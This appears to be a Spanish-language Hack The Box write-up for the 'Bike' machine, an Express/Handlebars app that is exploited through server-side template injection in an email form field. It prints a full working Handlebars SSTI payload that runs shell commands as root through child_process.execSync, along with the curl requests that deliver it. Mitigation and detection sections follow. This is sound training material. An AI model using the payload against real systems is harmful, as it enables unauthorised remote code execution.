---
machine: Bike
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, ssti, nodejs, rce, tier1]
---

# Bike — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

Formulario de suscripción en **80/tcp** sobre **Node.js/Express + Handlebars**. El email se renderiza como plantilla (`{{7*7}}` lanza un error de Handlebars) y con la cadena de escape se ejecuta código **como root**. La flag está en `/root/flag.txt`.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Node.js (Express middleware)
```

- **22/tcp** SSH sin credenciales: se ignora.
- **80/tcp** app Node con Express; un solo formulario de email.

## Enumeración

```bash
curl -s http://<TARGET_IP>/ | grep -iE "form|input|contact"
```

El formulario hace `POST /` con `email=<valor>` y devuelve `We will contact you at: <valor>`. Se comprueba si el valor se evalúa como plantilla:

```bash
curl -s -X POST http://<TARGET_IP>/ -d 'email={{7*7}}'
```

La respuesta no contiene `49`: Handlebars **no** evalúa aritmética, pero sí lanza un error de parseo que revela la ruta:

```text
Error: Parse error on line 1:
... /root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/...
```

- Motor: **Handlebars**.
- Directorio de la app: `/root/Backend`, es decir, el servicio corre **como root**.

## Foothold

Handlebars permite alcanzar el constructor de `Function` a través del prototipo. Payload de referencia (PayloadsAllTheThings, sección Handlebars):

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Se URL-encodea (Burp → Decoder) y se envía en `email`:

```bash
curl -s -X POST http://<TARGET_IP>/ --data-urlencode "email=<PAYLOAD_URLENCODED>"
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Se sustituye el comando por la lectura de la flag:

```text
return require('child_process').execSync('cat /root/flag.txt');
```

## Movimiento lateral

- No aplica: el proceso web ya es root en el único host.
- SSH queda como vía redundante si se quisiera persistencia.

## Escalada de privilegios

- No aplica: **no hay escalada**, el RCE nace como root porque el servicio se lanzó con ese usuario.
- Ese es el hallazgo real: un servicio de usuario final ejecutándose como administrador.

## Evidencia

- Error de Handlebars con la ruta `/root/Backend`.
- Salida de `id` como root y flag redactada.

## Lecciones aprendidas

- `{{7*7}}` distingue motores: Twig/Jinja devuelven `49`, Handlebars lanza error de parseo. El error también filtra rutas.
- SSTI se ejecuta en el servidor: no es XSS ni se ve en el HTML del cliente.
- La codificación URL es obligatoria; el payload lleva espacios, barras y comillas.
- Ejecutar Node como root convierte cualquier RCE en compromiso total.

## Mitigaciones y detección

**Cómo se corrige:**

- No pasar entrada de usuario como plantilla: usar variables y `{{ }}` solo para datos.
- Escapar/sanear el email y validarlo con una expresión regular estricta.
- Ejecutar el servicio con un usuario sin privilegios y aislado (contenedor, `systemd` hardening).
- WAF con firmas de SSTI como defensa adicional.

**Cómo se detectaría:**

- Peticiones con `{{`, `}}`, `${{` o `#{` en campos de formulario.
- Errores de plantilla en los logs de la aplicación.
- Procesos hijo inesperados (`sh`, `curl`, `cat`) lanzados por el servidor Node.

- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- OWASP Top 10 2021: A03 Injection
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.007 JavaScript](https://attack.mitre.org/techniques/T1059/007/)

## Referencias

- [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks — SSTI (Handlebars)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
